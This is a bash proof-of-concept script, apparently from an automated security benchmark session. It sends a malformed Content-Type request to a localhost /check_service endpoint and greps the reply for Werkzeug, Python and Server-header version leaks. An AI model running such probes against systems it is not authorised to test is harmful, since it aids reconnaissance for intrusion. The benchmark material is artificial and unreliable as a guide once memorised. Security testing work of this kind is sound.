#!/bin/bash
# POC: Demonstrates verbose error message information disclosure by sending invalid Content-Type header to /check_service endpoint, revealing framework details and implementation information
# Target: ./repo
# Created: 2025-11-07T19:19:22.712Z
# Session: benchmark-XBEN-068-24-mhp8iflp

# Verbose Error Message Information Disclosure POC
# This script demonstrates how the /check_service endpoint leaks framework details
# through verbose error messages when invalid Content-Type headers are sent

TARGET_URL="http://localhost:8080/check_service"

echo "=========================================="
echo "Verbose Error Message Information Disclosure POC"
echo "=========================================="
echo ""
echo "Target: $TARGET_URL"
echo ""

# Test 1: Send POST request with invalid Content-Type (text/plain instead of application/json)
echo "Test 1: Sending POST request with Content-Type: text/plain"
echo "Command: curl -i -X POST $TARGET_URL -H 'Content-Type: text/plain' -d 'invalid'"
echo ""

RESPONSE=$(curl -i -X POST "$TARGET_URL" -H 'Content-Type: text/plain' -d 'invalid' 2>/dev/null)

echo "Response:"
echo "$RESPONSE"
echo ""

# Extract and analyze the response
echo "=========================================="
echo "Analysis of Information Disclosed:"
echo "=========================================="
echo ""

# Check for HTTP 415 status
if echo "$RESPONSE" | grep -q "415 Unsupported Media Type"; then
    echo "✓ HTTP 415 Status Detected: Server reveals strict Content-Type validation"
fi

# Check for verbose error message
if echo "$RESPONSE" | grep -q "Did not attempt to load JSON data"; then
    echo "✓ Verbose Error Message Detected: 'Did not attempt to load JSON data because the request Content-Type was not'"
    echo "  This reveals:"
    echo "  - Endpoint expects JSON data"
    echo "  - Application validates Content-Type headers"
    echo "  - Likely uses Flask/Werkzeug framework error handling"
fi

# Check for framework version disclosure
if echo "$RESPONSE" | grep -qi "Werkzeug"; then
    echo "✓ Framework Disclosure Detected: Response contains Werkzeug version information"
    WERKZEUG_VERSION=$(echo "$RESPONSE" | grep -oP 'Werkzeug/[\d.]+' | head -1)
    echo "  Disclosed: $WERKZEUG_VERSION"
fi

if echo "$RESPONSE" | grep -qi "Python"; then
    echo "✓ Python Version Disclosure Detected: Response contains Python version information"
    PYTHON_VERSION=$(echo "$RESPONSE" | grep -oP 'Python/[\d.]+' | head -1)
    echo "  Disclosed: $PYTHON_VERSION"
fi

# Check for Server header revealing framework
if echo "$RESPONSE" | grep -qi "Server:"; then
    echo "✓ Server Header Disclosure:"
    SERVER_HEADER=$(echo "$RESPONSE" | grep -i "^Server:" | head -1)
    echo "  $SERVER_HEADER"
fi

echo ""
echo "=========================================="
echo "Vulnerability Confirmed: Information Disclosure via Verbose Error Messages"
echo "=========================================="